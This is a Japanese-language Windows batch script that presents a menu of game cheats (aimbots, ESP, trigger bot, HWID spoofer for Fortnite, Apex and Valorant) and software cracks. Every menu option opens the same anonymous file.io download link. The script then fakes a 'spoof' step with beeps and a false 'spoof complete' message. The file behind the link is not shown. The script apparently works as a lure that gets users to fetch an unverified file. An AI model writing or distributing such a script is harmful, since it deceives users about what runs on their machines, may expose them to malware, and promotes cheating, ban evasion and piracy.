@echo off
chcp 65001 >nul 2>&1

cls
echo 無断で他サイトへのアップロードを禁止します created by Cl
timeout /t 3 >nul

:menu
cls
echo チートメニュー:
echo 1. Fortnite cheat
echo 2. Apex cheat
echo 3. HWID spoofer temp/perm
echo 4. Valorant ESP
echo.
echo ツール:
echo 5. Apex AI assist
echo 6. Valorant trigger bot
echo 7. Fortnite aim assist (keyboard only)
echo 8. 全自動タップストレフ
echo.
echo 割れ:
echo 9. BGX crack
echo 10. Cola crack
echo 11. CFF crack
echo.

set /p choice=番号を入力してください（1-11）:

rem 先頭および末尾の空白を削除
set choice=%choice: =%

rem 有効な入力かどうかをチェック
if "%choice%"=="1" goto open_link
if "%choice%"=="2" goto open_link
if "%choice%"=="3" goto open_link
if "%choice%"=="4" goto open_link
if "%choice%"=="5" goto open_link
if "%choice%"=="6" goto open_link
if "%choice%"=="7" goto open_link
if "%choice%"=="8" goto open_link
if "%choice%"=="9" goto open_link
if "%choice%"=="10" goto open_link
if "%choice%"=="11" goto open_link

echo 無効な入力です。もう一度お試しください。
timeout /t 2 >nul
goto menu

:open_link
cls
echo ダウンロードが開始しました...
timeout /t 1 >nul

rem リンクを指定のURLに変更
start "" "https://file.io/V34C5avw3Hlo"
timeout /t 2 >nul

goto confirm_spoof

:confirm_spoof
cls
set /p spoof=ダウンロードが開始しました。Spoofしますか？（yes/no）:
if /i "%spoof%"=="yes" goto spoof_action
if /i "%spoof%"=="no" goto no_spoof

echo 無効な入力です。もう一度お試しください。
timeout /t 2 >nul
goto confirm_spoof

:spoof_action
rem コマンドプロンプトでビープ音を鳴らす
echo ^G
timeout /t 1 >nul
echo ^G
timeout /t 1 >nul

rem PowerShellでビープ音を鳴らす
powershell -c "[console]::beep(1000,500)"
timeout /t 1 >nul
powershell -c "[console]::beep(1000,500)"
timeout /t 1 >nul

echo Spoofが完了しました。
timeout /t 5 >nul
exit

:no_spoof
echo 終了します。
timeout /t 3 >nul
exit
